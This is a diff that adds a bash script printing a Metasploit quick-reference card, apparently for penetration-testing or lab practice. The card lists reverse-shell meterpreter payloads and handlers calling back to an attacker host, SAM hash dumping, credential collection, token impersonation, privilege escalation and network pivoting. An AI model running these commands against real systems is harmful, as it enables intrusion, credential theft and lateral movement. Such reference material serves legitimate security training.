@@ -1,0 +1,69 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── METASPLOIT — REFERENCE ───────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Core Workflow ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfconsole -q${NC}"
+echo -e "  ${GREEN}search <term>${NC}"
+echo -e "  ${GREEN}use <module>${NC}"
+echo -e "  ${GREEN}set RHOSTS <IP>${NC}"
+echo -e "  ${GREEN}set PAYLOAD windows/x64/meterpreter/reverse_tcp${NC}"
+echo -e "  ${GREEN}set LHOST tun0${NC}"
+echo -e "  ${GREEN}show options${NC}"
+echo -e "  ${GREEN}exploit / run${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Session Management ───────────────────────────────${NC}"
+echo -e "  ${GREEN}sessions -l${NC}                    # list"
+echo -e "  ${GREEN}sessions -i <ID>${NC}               # interact"
+echo -e "  ${GREEN}sessions -u <ID>${NC}               # upgrade to meterpreter"
+echo -e "  ${GREEN}sessions -K${NC}                    # kill all"
+echo -e "  ${GREEN}background${NC}                     # background current session"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Meterpreter — Key Commands ───────────────────────${NC}"
+echo -e "  ${GREEN}getuid${NC}                         # current user"
+echo -e "  ${GREEN}getsystem${NC}                      # privesc attempt"
+echo -e "  ${GREEN}hashdump${NC}                       # dump SAM"
+echo -e "  ${GREEN}migrate <PID>${NC}                  # migrate to another process"
+echo -e "  ${GREEN}upload /src /dst${NC}               # upload file"
+echo -e "  ${GREEN}download <file>${NC}                # download file"
+echo -e "  ${GREEN}shell${NC}                          # drop to cmd"
+echo -e "  ${GREEN}load incognito${NC}"
+echo -e "  ${GREEN}list_tokens -u${NC}"
+echo -e "  ${GREEN}impersonate_token 'DOMAIN\\\\user'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Post-Exploitation Modules ────────────────────────${NC}"
+echo -e "  ${GREEN}run post/windows/gather/smart_hashdump${NC}"
+echo -e "  ${GREEN}run post/multi/recon/local_exploit_suggester${NC}"
+echo -e "  ${GREEN}run post/windows/manage/enable_rdp${NC}"
+echo -e "  ${GREEN}run post/windows/gather/credentials/credential_collector${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Pivoting via Meterpreter ─────────────────────────${NC}"
+echo -e "  ${GREEN}run post/multi/manage/autoroute SESSION=<n>${NC}"
+echo -e "  ${GREEN}run autoroute -s 10.10.10.0/24${NC}"
+echo -e "  ${GREEN}use auxiliary/server/socks_proxy; set SRVPORT 1080; run${NC}"
+echo -e "  ${GREEN}portfwd add -l 3389 -p 3389 -r <INTERNAL_IP>${NC}"
+echo -e "  ${GREEN}portfwd list${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Handler (listener only) ──────────────────────────${NC}"
+echo -e "  ${GREEN}use exploit/multi/handler${NC}"
+echo -e "  ${GREEN}set payload windows/x64/meterpreter/reverse_https${NC}"
+echo -e "  ${GREEN}set LHOST tun0${NC}"
+echo -e "  ${GREEN}set LPORT 443${NC}"
+echo -e "  ${GREEN}exploit -j${NC}                     # -j = run as job (background)"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
